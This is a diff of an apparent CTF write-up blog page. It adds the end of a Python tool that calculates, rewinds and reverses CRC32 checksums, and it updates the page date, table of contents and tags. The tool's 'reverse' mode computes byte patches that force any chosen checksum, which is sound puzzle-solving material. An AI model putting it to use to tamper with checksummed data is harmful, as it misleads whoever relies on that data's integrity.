+        g = list(kg[<span class="number">1</span>])
+        <span class="keyword">yield</span> g[<span class="number">0</span>][<span class="number">1</span>], g[<span class="number">-1</span>][<span class="number">1</span>]
+<span class="function"><span class="keyword">def</span> <span class="title">rangess</span><span class="params">(i)</span>:</span>
+    <span class="keyword">return</span> <span class="string">', '</span>.join(map(<span class="keyword">lambda</span> x: <span class="string">'[{0},{1}]'</span>.format(*x), ranges(i)))
+<span class="comment"># Parsers</span>
+<span class="function"><span class="keyword">def</span> <span class="title">get_parser</span><span class="params">()</span>:</span>
+    <span class="string">''' Return the command-line parser '''</span>
+    parser = argparse.ArgumentParser(
+        description=<span class="string">"Reverse, undo, and calculate CRC32 checksums"</span>)
+    subparsers = parser.add_subparsers(metavar=<span class="string">'action'</span>)
+    poly_flip_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)
+    subparser_group = poly_flip_parser.add_mutually_exclusive_group()
+    subparser_group.add_argument(
+        <span class="string">'-m'</span>, <span class="string">'--msbit'</span>, dest=<span class="string">"msb"</span>, action=<span class="string">'store_true'</span>,
+        help=<span class="string">'treat the polynomial as normal (msbit-first)'</span>)
+    subparser_group.add_argument(<span class="string">'-l'</span>, <span class="string">'--lsbit'</span>, action=<span class="string">'store_false'</span>,
+                                 help=<span class="string">'treat the polynomial as reversed (lsbit-first) [default]'</span>)
+    desired_poly_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)
+    desired_poly_parser.add_argument(
+        <span class="string">'desired'</span>, type=str, help=<span class="string">'[int] desired checksum'</span>)
+    default_poly_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)
+    default_poly_parser.add_argument(
+        <span class="string">'poly'</span>, default=<span class="string">'0xEDB88320'</span>, type=str, nargs=<span class="string">'?'</span>,
+        help=<span class="string">'[int] polynomial [default: 0xEDB88320]'</span>)
+    accum_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)
+    accum_parser.add_argument(
+        <span class="string">'accum'</span>, type=str, help=<span class="string">'[int] accumulator (final checksum)'</span>)
+    default_accum_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)
+    default_accum_parser.add_argument(
+        <span class="string">'accum'</span>, default=<span class="string">'0'</span>, type=str, nargs=<span class="string">'?'</span>,
+        help=<span class="string">'[int] starting accumulator [default: 0]'</span>)
+    outfile_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)
+    outfile_parser.add_argument(<span class="string">'-o'</span>, <span class="string">'--outfile'</span>,
+                                metavar=<span class="string">"f"</span>,
+                                type=argparse.FileType(<span class="string">'w'</span>),
+                                default=sys.stdout,
+                                help=<span class="string">"Output to a file instead of stdout"</span>)
+    infile_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)
+    subparser_group = infile_parser.add_mutually_exclusive_group()
+    subparser_group.add_argument(<span class="string">'-i'</span>, <span class="string">'--infile'</span>,
+                                 metavar=<span class="string">"f"</span>,
+                                 type=argparse.FileType(<span class="string">'rb'</span>),
+                                 default=sys.stdin,
+                                 help=<span class="string">"Input from a file instead of stdin"</span>)
+    subparser_group.add_argument(<span class="string">'-s'</span>, <span class="string">'--str'</span>,
+                                 metavar=<span class="string">"s"</span>,
+                                 type=str,
+                                 default=<span class="string">''</span>,
+                                 dest=<span class="string">'instr'</span>,
+                                 help=<span class="string">"Use a string as input"</span>)
+    subparser = subparsers.add_parser(<span class="string">'flip'</span>, parents=[outfile_parser],
+                                      help=<span class="string">"flip the bits to convert normal(msbit-first) polynomials to reversed (lsbit-first) and vice versa"</span>)
+    subparser.add_argument(<span class="string">'poly'</span>, type=str, help=<span class="string">'[int] polynomial'</span>)
+    subparser.set_defaults(
+        func=<span class="keyword">lambda</span>: print_num(reverseBits(parse_dword(args.poly))))
+    subparser = subparsers.add_parser(<span class="string">'reciprocal'</span>, parents=[outfile_parser],
+                                      help=<span class="string">"find the reciprocal (Koopman notation) of a reversed (lsbit-first) polynomial and vice versa"</span>)
+    subparser.add_argument(<span class="string">'poly'</span>, type=str, help=<span class="string">'[int] polynomial'</span>)
+    subparser.set_defaults(func=reciprocal_callback)
+    subparser = subparsers.add_parser(<span class="string">'table'</span>, parents=[outfile_parser,
+                                                        poly_flip_parser,
+                                                        default_poly_parser],
+                                      help=<span class="string">"generate a lookup table for a polynomial"</span>)
+    subparser.set_defaults(func=table_callback)
+    subparser = subparsers.add_parser(<span class="string">'reverse'</span>, parents=[
+        outfile_parser,
+        poly_flip_parser,
+        desired_poly_parser,
+        default_accum_parser,
+        default_poly_parser],
+        help=<span class="string">"find a patch that causes the CRC32 checksum to become a desired value"</span>)
+    subparser.set_defaults(func=reverse_callback)
+    subparser = subparsers.add_parser(<span class="string">'undo'</span>, parents=[
+        outfile_parser,
+        poly_flip_parser,
+        accum_parser,
+        default_poly_parser,
+        infile_parser],
+        help=<span class="string">"rewind a CRC32 checksum"</span>)
+    subparser.add_argument(<span class="string">'-n'</span>, <span class="string">'--len'</span>, metavar=<span class="string">'l'</span>, type=str,
+                           default=<span class="string">'0'</span>, help=<span class="string">'[int] number of bytes to rewind [default: 0]'</span>)
+    subparser.set_defaults(func=undo_callback)
+    subparser = subparsers.add_parser(<span class="string">'calc'</span>, parents=[
+        outfile_parser,
+        poly_flip_parser,
+        default_accum_parser,
+        default_poly_parser,
+        infile_parser],
+        help=<span class="string">"calculate the CRC32 checksum"</span>)
+    subparser.set_defaults(func=calc_callback)
+    <span class="keyword">return</span> parser
+<span class="function"><span class="keyword">def</span> <span class="title">reciprocal_callback</span><span class="params">()</span>:</span>
+    poly = parse_dword(args.poly)
+    check32(poly)
+    print_num(reciprocal(poly))
+<span class="function"><span class="keyword">def</span> <span class="title">table_callback</span><span class="params">()</span>:</span>
+    <span class="comment"># initialize tables</span>
+    init_tables(get_poly(), <span class="keyword">False</span>)
+    <span class="comment"># print table</span>
+    out(<span class="string">'[{0}]'</span>.format(<span class="string">', '</span>.join(map(<span class="string">'0x{0:08x}'</span>.format, table))))
+<span class="function"><span class="keyword">def</span> <span class="title">reverse_callback</span><span class="params">()</span>:</span>
+    <span class="comment"># initialize tables</span>
+    init_tables(get_poly())
+    <span class="comment"># find reverse bytes</span>
+    desired = parse_dword(args.desired)
+    accum = parse_dword(args.accum)
+    <span class="comment"># 4-byte patch</span>
+    patches = findReverse(desired, accum)
+    <span class="keyword">for</span> patch <span class="keyword">in</span> patches:
+        out(<span class="string">'4 bytes: {{0x{0:02x}, 0x{1:02x}, 0x{2:02x}, 0x{3:02x}}}'</span>.format(*patch))
+        checksum = calc(patch, accum)
+        out(<span class="string">'verification checksum: 0x{0:08x} ({1})'</span>.format(
+            checksum, <span class="string">'OK'</span> <span class="keyword">if</span> checksum == desired <span class="keyword">else</span> <span class="string">'ERROR'</span>))
+    <span class="comment"># 6-byte alphanumeric patches</span>
+    <span class="keyword">for</span> i <span class="keyword">in</span> permitted_characters:
+        <span class="keyword">for</span> j <span class="keyword">in</span> permitted_characters:
+            patch = [i, j]
+            patches = findReverse(desired, calc(patch, accum))
+            <span class="keyword">for</span> last_4_bytes <span class="keyword">in</span> patches:
+                <span class="keyword">if</span> all(p <span class="keyword">in</span> permitted_characters <span class="keyword">for</span> p <span class="keyword">in</span> last_4_bytes):
+                    patch.extend(last_4_bytes)
+                    out(<span class="string">'alternative: {1}{2}{3}{4}{5}{6} ({0})'</span>.format(
+                        <span class="string">'OK'</span> <span class="keyword">if</span> calc(patch, accum) == desired <span class="keyword">else</span> <span class="string">'ERROR'</span>, *map(chr, patch)))
+<span class="function"><span class="keyword">def</span> <span class="title">undo_callback</span><span class="params">()</span>:</span>
+    <span class="comment"># initialize tables</span>
+    init_tables(get_poly())
+    <span class="comment"># calculate checksum</span>
+    accum = parse_dword(args.accum)
+    maxlen = int(args.len, <span class="number">0</span>)
+    data = get_input()
+    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt; maxlen &lt;= len(data):
+        maxlen = len(data)
+    out(<span class="string">'rewinded {0}/{1} ({2:.2f}%)'</span>.format(maxlen, len(data),
+        maxlen * <span class="number">100.0</span> / len(data) <span class="keyword">if</span> len(data) <span class="keyword">else</span> <span class="number">100</span>))
+    <span class="keyword">for</span> solution <span class="keyword">in</span> rewind(accum, data[-maxlen:]):
+        out(<span class="string">''</span>)
+        print_num(solution)
+<span class="function"><span class="keyword">def</span> <span class="title">calc_callback</span><span class="params">()</span>:</span>
+    <span class="comment"># initialize tables</span>
+    init_tables(get_poly(), <span class="keyword">False</span>)
+    <span class="comment"># calculate checksum</span>
+    accum = parse_dword(args.accum)
+    data = get_input()
+    out(<span class="string">'data len: {0}'</span>.format(len(data)))
+    out(<span class="string">''</span>)
+    print_num(calc(data, accum))
+<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(argv=None)</span>:</span>
+    <span class="string">''' Runs the program and handles command line options '''</span>
+    parser = get_parser()
+    <span class="comment"># Parse arguments and run the function</span>
+    <span class="keyword">global</span> args
+    args = parser.parse_args(argv)
+    args.func()
+<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:
+    main()  <span class="comment"># pragma: no cover</span>
+</code></pre>
 
       
 
@@ -272,8 +583,8 @@
 		<p style="text-align:justify">	
 		&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
 		最后更新：
-            <time datetime="2017-07-03T17:38:23.883Z" itemprop="dateLastModified">
-            2017-07-04
+            <time datetime="2017-07-11T14:46:25.206Z" itemprop="dateLastModified">
+            2017-07-11
             </time>
         </div>
         <br>
@@ -317,7 +628,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-125"><span class="toc-number">1.1.</span> <span class="toc-text">web 125</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-150"><span class="toc-number">1.2.</span> <span class="toc-text">web 150</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-150"><span class="toc-number">2.1.</span> <span class="toc-text">crypto 150</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web125"><span class="toc-number">1.1.</span> <span class="toc-text">web125</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web150-400"><span class="toc-number">1.2.</span> <span class="toc-text">web150, 400</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web200"><span class="toc-number">1.3.</span> <span class="toc-text">web200</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-100"><span class="toc-number">2.1.</span> <span class="toc-text">crypto 100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-150"><span class="toc-number">2.2.</span> <span class="toc-text">crypto 150</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -431,11 +742,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">樱花</a>
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">绿生</a>
+                <a href="javascript:void(0)" class="js-tag color3">OpenCTF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -443,15 +754,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">柠檬之涩</a>
+                <a href="javascript:void(0)" class="js-tag color3">樱花</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">番茄蛋汤</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Hexo</a>
+                <a href="javascript:void(0)" class="js-tag color3">绿生</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -463,11 +770,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+                <a href="javascript:void(0)" class="js-tag color5">Hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">OpenCTF</a>
+                <a href="javascript:void(0)" class="js-tag color5">柠檬之涩</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">番茄蛋汤</a>
               </li>
              
               <li class="article-tag-list-item">
